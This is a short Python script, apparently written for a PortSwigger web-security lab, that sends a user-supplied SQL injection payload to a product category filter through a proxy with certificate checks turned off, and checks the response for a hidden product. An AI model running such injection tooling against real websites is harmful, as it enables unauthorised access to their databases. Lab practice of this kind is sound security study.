# You have to give the url of portswigger lab and then type the pyload in terminal and then just press Enter.
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# if you are using another proxy you can change it and use it.
proxies = {'http': 'http://172.16.0.6:80', 'https': 'http://172.16.0.6:80'}

def exploit_sqli(url, payload):
    uri = '/filter?category='
    # Saving the request into a r file.
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    # Cheacking the hidden product in the list of r.
    if "Pest Control Umbrella" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    # Getting input in the termianl "argv[1] is url you have give in the terminal" and " after it argv[2] the payload you will use for ending the task.
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, payload): 
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")

